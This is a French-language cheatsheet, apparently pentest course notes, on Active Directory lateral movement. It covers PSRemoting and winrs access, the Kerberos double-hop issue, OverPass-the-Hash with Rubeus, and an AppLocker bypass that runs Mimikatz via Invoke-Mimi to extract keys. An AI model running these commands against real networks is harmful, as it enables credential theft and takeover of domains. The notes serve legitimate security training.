# Cheatsheet - Lateral movement

> [!summary] Objectif
> Passer d'une machine à une autre en rejouant des creds sans mot de passe clair, ou en atteignant un hôte où une session privilégiée traîne déjà.

> [!abstract] Pourquoi · Chaînage
> **Exploiter** un cred/hash déjà volé pour atteindre une **nouvelle machine** (sans mdp clair) ou une session privilégiée qui y traîne.
> **Prérequis** hash/clé/mdp ([[Cheatsheet - Post-exploitation]]) → **débloque** une nouvelle machine / identité.

### Basic remote access

```powershell
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\<USER>
winrs -r:<TARGET> cmd
```

### Après `Find-PSRemotingLocalAdminAccess` (où suis-je admin en WinRM)

Le script liste les hôtes où **ton identité courante** est admin local via PSRemoting. Ensuite :

```powershell
Enter-PSSession -ComputerName <TARGET>                              # interactif
Invoke-Command -ComputerName <TARGET> -ScriptBlock { whoami /all; klist }
```

Sur la nouvelle box : re-dump les creds → nouvelles identités/tickets → re-hunt → saut suivant (vers DA). Pour y aller avec un compte **dumpé** (≠ user courant) : OverPass-the-Hash d'abord (ci-dessous), puis `Enter-PSSession` en Kerberos.

> [!warning] Double-hop
> Dans une session PSRemoting, tes creds **ne se propagent pas** vers un 3e hôte (logon réseau, pas de délégation) → *access denied* plus loin. Contourne : OverPass-the-Hash **dans** la session (injecte un TGT), `-Credential` explicite, ou CredSSP. Sinon, lance les outils **localement** sur la box distante.
> **Piège fréquent :** tu es DÉJÀ dans la session → relancer `Invoke-Command -ComputerName <même box>` de l'intérieur = un 2e hop → `Access is denied`. Tape les commandes **direct** dans le prompt `[box]:`.

> [!note] `Enter-PSSession` réussit ≠ tu es admin/SYSTEM
> Réussir à remoter = juste *Remote Management Users*. Ça garde **ton** identité (pas SYSTEM). Vérifie l'admin réel : `whoami /groups` (High Mandatory Level + `BUILTIN\Administrators`) ou `net localgroup Administrators`. Admin local **suffit** pour dumper LSASS.
> Charger un outil sur la box distante **sans 2e hop** : `Copy-Item <tool>.ps1 -Destination C:\Users\Public\ -ToSession $sess` (le canal de la session, pas une connexion réseau).

### OverPass-the-Hash (rejouer un hash/clé AES en TGT)

> Permet de devenir intégralement le compte visé (toute action Kerberos : `winrs`, partages, autres tickets) à partir d'un simple hash/clé AES volé — jamais besoin de casser ni de connaître le mot de passe en clair pour l'utiliser.

> [!warning]- Required
> Hash NTLM ou clé AES du compte ciblé — s'obtient par DCSync ou extraction locale, voir [[Cheatsheet - Persistence]].

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Toute commande lancée dans le process spawné (`winrs`, `xcopy`) s'exécute avec les privilèges de `svcadmin`.

### Bypass AppLocker avec Invoke-MimiEx

Quand `Loader.exe` est bloqué par AppLocker sur la cible mais que le dot-sourcing `.ps1` reste autorisé : copier `Invoke-Mimi.ps1`, y coller l'appel de fonction directement dans le script (`Invoke-Mimi -Command '"sekurlsa::ekeys"'`), le transférer et l'exécuter par dot-source sur l'hôte cible plutôt que de lancer un binaire.

> [!note] Si les identifiants sont déjà présents dans la session, éviter d'en ajouter en clair sur la ligne de commande.

**Link**
- [[Cheatsheet - Privilege escalation]]
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Tickets Kerberos]]
- [[What is PowerShell]]
